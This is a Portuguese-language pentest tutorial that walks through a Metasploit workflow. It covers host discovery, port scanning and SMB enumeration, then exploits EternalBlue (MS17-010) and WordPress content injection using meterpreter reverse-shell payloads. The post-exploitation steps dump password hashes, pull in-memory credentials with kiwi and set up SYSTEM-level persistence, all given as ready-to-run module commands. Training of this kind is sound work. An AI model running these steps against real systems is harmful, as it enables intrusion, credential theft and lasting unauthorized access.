## Visão geral
Este conteúdo apresenta um fluxo básico de **pentest** com foco no **Metasploit Framework**, cobrindo:

- identificação de dispositivos ativos
- varredura de portas
- enumeração de SMB
- exploração de vulnerabilidades conhecidas
- pós-exploração
- exploração de aplicações WordPress
- estudo contínuo com comunidades e certificações

---

## 1. Reconhecimento e descoberta de alvos

### Teoria
A primeira etapa de um pentest é identificar quais hosts estão ativos na rede e quais serviços estão expostos. Isso ajuda a reduzir o escopo e encontrar possíveis pontos de entrada.

### Comando — Identificação de dispositivos ativos
```text
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS <rede alvo>
set INTERFACE <interface da rede alvo>
run
```

### Comando — Varredura de portas
```text
use auxiliary/scanner/portscan/tcp
set RHOSTS <IPs alvo>
set PORTS <range de porta>
run
```

---

## 2. Enumeração de SMB

### Teoria
O SMB é um protocolo muito usado em ambientes Windows para compartilhamento de arquivos e recursos. Verificar sua versão é importante porque versões antigas, como SMBv1, podem estar associadas a falhas críticas.

### Comando — Verificar a versão do SMB
```text
use auxiliary/scanner/smb/smb_version
set RHOSTS <IP alvo>
run
```

### Observação importante
- Se o alvo usar **SMBv1**, vale investigar a vulnerabilidade **MS17-010**, historicamente ligada ao **EternalBlue**.

---

## 3. Exploração de vulnerabilidade SMB

### Teoria
Quando um sistema está vulnerável ao **MS17-010**, é possível explorar a falha para obter uma sessão remota. Em laboratórios e ambientes autorizados, isso permite demonstrar o impacto de sistemas desatualizados.

### Comando — Exploit EternalBlue
```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <IP alvo>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP local>
set LPORT <porta local>
run
```

---

## 4. Pós-exploração em Windows

### Teoria
Depois de conseguir acesso, a fase de pós-exploração busca entender o impacto do comprometimento. Isso pode incluir coleta de hashes, credenciais em memória e persistência.

### Comando — Coletar hashes locais
```text
hashdump
```

### Teoria
O `hashdump` tenta extrair hashes de senhas locais do sistema comprometido. Em um contexto autorizado, isso serve para avaliar o risco de exposição de credenciais.

### Comandos — Capturar credenciais em memória
```text
load kiwi
creds_all
```

### Teoria
O módulo `kiwi` é usado para interagir com credenciais e segredos presentes na memória do sistema, ajudando a medir o impacto de um comprometimento.

### Comando — Persistência
```text
use post/windows/manage/persistence
set SESSION <sessão>
set LHOST <IP local>
set LPORT <porta local>
set STARTUP SYSTEM
run
```

### Teoria
Persistência é a capacidade de manter acesso ao sistema mesmo após reinicialização ou fim da sessão. É uma etapa clássica de pós-exploração em testes controlados.

---

## 5. Exploração em WordPress

### Teoria
Aplicações web também podem ser alvo de falhas de configuração ou injeção de conteúdo. Em WordPress, módulos do Metasploit podem ser usados para demonstrar execução remota de comandos e obtenção de shell reversa.

### Comando — WordPress content injection
```text
use exploit/unix/webapp/wp_content_injection
set RHOSTS <IP alvo>
set TARGETURI /URL/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <IP local>
set LPORT <porta local>
run
```

### Teoria
Após a exploração, é comum fazer a enumeração local para entender melhor o sistema comprometido.

### Comandos — Enumeração local
```text
sysinfo
getuid
```

### Teoria
- `sysinfo` mostra informações do sistema operacional e da máquina
- `getuid` exibe o usuário atual da sessão

### Teoria — Busca por credenciais
Em aplicações WordPress, arquivos de configuração como `wp-config.php` podem conter credenciais importantes, como acesso ao banco de dados.

---

## 6. Fluxo resumido do ataque em laboratório

### Etapas
1. **Descobrir hosts ativos**
2. **Varredura de portas**
3. **Enumerar SMB**
4. **Identificar vulnerabilidades**
5. **Explorar o alvo**
6. **Executar pós-exploração**
7. **Coletar informações e credenciais**
8. **Testar persistência**
9. **Documentar os achados**

---

## 7. Estudo contínuo

### Fóruns e comunidades
- Offensive Security Community
- NetSec Focus
- Red Team Village
- Hack The Box
- TryHackMe
- Exploit-DB

### Certificações
- OSCP
- eJPT
- CRTO
- CompTIA PenTest+
- INE Pentester Path
- Offensive Tools Courses

---

## 8. Conceitos principais

- **Reconhecimento**: mapear rede e serviços
- **Enumeração**: coletar detalhes técnicos do alvo
- **Exploração**: usar uma falha para obter acesso
- **Pós-exploração**: medir o impacto do comprometimento
- **Persistência**: manter acesso ao sistema
- **Estudo contínuo**: praticar em labs e acompanhar comunidades
